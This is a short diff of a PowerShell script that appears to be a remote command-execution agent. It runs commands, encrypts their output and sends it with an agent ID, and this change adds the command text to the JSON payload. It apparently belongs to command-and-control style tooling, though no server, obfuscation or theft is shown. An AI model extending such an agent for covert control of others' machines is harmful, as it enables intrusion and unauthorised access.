@@ -175,12 +175,13 @@ function Execute-Command {
     $encrypted_result = Encrypt-Data -data $output
 
     # Send the result
-    Send-Result -AgentID $agent_id -Output $encrypted_result
+    Send-Result -AgentID $agent_id -Command $command -Output $encrypted_result
 }
 
 function Send-Result {
     param (
         [string]$AgentID,
+        [string]$Command,
         [string]$Output
     )
 
@@ -199,6 +200,7 @@ function Send-Result {
     # Prepare the payload
     $Payload = @{
         AgentID = $AgentID
+        Command = $Command
         Result  = $EncryptedResult
     } | ConvertTo-Json -Depth 2
 
